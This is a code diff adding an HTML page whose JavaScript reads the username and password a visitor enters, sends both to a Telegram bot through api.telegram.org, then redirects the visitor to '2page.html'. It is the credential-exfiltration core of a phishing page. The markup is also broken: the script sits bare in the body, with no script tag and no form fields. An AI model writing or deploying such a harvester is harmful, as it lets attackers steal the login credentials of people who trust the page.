@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<body>
+    function submitForm() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+    
+    // Replace these with your actual Telegram bot token and chat ID
+    const botToken = 'YOUR_BOT_TOKEN';
+    const chatId = 'YOUR_CHAT_ID';
+
+    // Prepare message
+    const message = `Username: ${username}\nPassword: ${password}`;
+
+    // Send message to Telegram bot
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+        }),
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            // Redirect to 2page.html after sending the message
+            window.location.href = '2page.html';
+        } else {
+            console.error('Error sending message:', data.description);
+        }
+    })
+    .catch(error => console.error('Error:', error));
+}
+  
+  
+</body>
+</html>
